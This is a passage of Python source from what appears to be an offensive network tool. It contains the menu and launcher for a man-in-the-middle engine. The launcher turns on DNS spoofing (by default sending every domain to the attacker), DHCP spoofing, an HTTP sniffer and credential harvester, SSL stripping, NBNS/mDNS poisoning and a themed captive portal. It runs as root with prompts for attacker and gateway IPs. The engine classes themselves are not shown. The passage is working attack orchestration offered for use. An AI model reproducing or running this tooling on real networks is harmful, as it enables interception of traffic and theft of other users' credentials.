    # ── NBNS / mDNS
    if enable_nbns:
        nbns = NBNSPoisoner(iface, attacker_ip)
        threads.append(nbns.start())

    # ── Captive Portal
    if enable_portal:
        portal = CaptivePortal(attacker_ip, port=8888, theme=portal_theme)
        threads.append(portal.start())

    section("MITM ENGINE ACTIVE")
    console.print(Panel(
        f"  [{C_DIM}]All engines running. Press Ctrl+C to stop and clean up.[/{C_DIM}]\n\n"
        f"  {tag('DNS Spoofer:',    C_GOOD if enable_dns       else C_DIM)}  "
        f"{'ACTIVE' if enable_dns        else 'OFF'}\n"
        f"  {tag('DHCP Spoofer:',   C_GOOD if enable_dhcp      else C_DIM)}  "
        f"{'ACTIVE' if enable_dhcp       else 'OFF'}\n"
        f"  {tag('HTTP Sniffer:',   C_GOOD if enable_http_sniff else C_DIM)}  "
        f"{'ACTIVE' if enable_http_sniff else 'OFF'}\n"
        f"  {tag('SSL Stripper:',   C_GOOD if enable_ssl_strip  else C_DIM)}  "
        f"{'ACTIVE' if enable_ssl_strip  else 'OFF'}\n"
        f"  {tag('NBNS/mDNS:',      C_GOOD if enable_nbns      else C_DIM)}  "
        f"{'ACTIVE' if enable_nbns       else 'OFF'}\n"
        f"  {tag('Captive Portal:', C_GOOD if enable_portal     else C_DIM)}  "
        f"{'ACTIVE — theme: ' + portal_theme if enable_portal else 'OFF'}",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ ENGINE STATUS[/bold {C_BLOOD}]",
        padding=(1,2)
    ))

    try:
        while not stop_flag.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        stop_flag.set()
        full_cleanup()


# ════════════════════════════════════════════════════════════════════════════
# ── TUI MENU (standalone or called from ktox.py) ─────────────────────────────
# ════════════════════════════════════════════════════════════════════════════

def mitm_menu(iface, attacker_ip, gateway_ip):
    """Interactive MITM module selector."""
    section("MITM ENGINE CONFIGURATION")

    console.print(f"  [{C_STEEL}]Interface: {iface}  IP: {attacker_ip}[/{C_STEEL}]\n")

    dns_on   = Confirm.ask(f"  [{C_BLOOD}]Enable DNS Spoofer?[/{C_BLOOD}]",        default=True)
    dhcp_on  = Confirm.ask(f"  [{C_BLOOD}]Enable DHCP Spoofer?[/{C_BLOOD}]",       default=True)
    http_on  = Confirm.ask(f"  [{C_BLOOD}]Enable HTTP Sniffer + Harvester?[/{C_BLOOD}]", default=True)
    ssl_on   = Confirm.ask(f"  [{C_BLOOD}]Enable SSL Stripper?[/{C_BLOOD}]",        default=True)
    nbns_on  = Confirm.ask(f"  [{C_BLOOD}]Enable NBNS/mDNS Poisoner?[/{C_BLOOD}]", default=True)
    portal_on= Confirm.ask(f"  [{C_BLOOD}]Enable Captive Portal?[/{C_BLOOD}]",      default=False)

    dns_rules = {"*": attacker_ip}
    if dns_on:
        custom = Prompt.ask(
            f"  [{C_STEEL}]DNS rules [{C_DIM}]domain:ip,domain:ip or * for all[/{C_DIM}][/{C_STEEL}]",
            default="*"
        )
        if custom != "*" and ":" in custom:
            dns_rules = {}
            for pair in custom.split(","):
                parts = pair.strip().split(":")
                if len(parts) == 2:
                    dns_rules[parts[0].strip()] = parts[1].strip()
        else:
            dns_rules = {"*": attacker_ip}

    portal_theme = "wifi"
    if portal_on:
        themes = list(PORTAL_THEMES.keys())
        console.print(f"  [{C_STEEL}]Portal themes: {', '.join(themes)}[/{C_STEEL}]")
        portal_theme = Prompt.ask(
            f"  [{C_BLOOD}]Select theme[/{C_BLOOD}]",
            default="wifi"
        )

    launch_full_mitm(
        iface=iface,
        attacker_ip=attacker_ip,
        gateway_ip=gateway_ip,
        dns_rules=dns_rules,
        portal_theme=portal_theme,
        enable_ssl_strip=ssl_on,
        enable_dns=dns_on,
        enable_dhcp=dhcp_on,
        enable_http_sniff=http_on,
        enable_portal=portal_on,
        enable_nbns=nbns_on,
    )


# ── Standalone entry ──────────────────────────────────────────────────────────
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("ERROR: Must run as root"); sys.exit(1)

    import netifaces
    iface       = Prompt.ask("Interface", default="wlan0")
    attacker_ip = Prompt.ask("Attacker IP")
    gateway_ip  = Prompt.ask("Gateway IP")

    mitm_menu(iface, attacker_ip, gateway_ip)
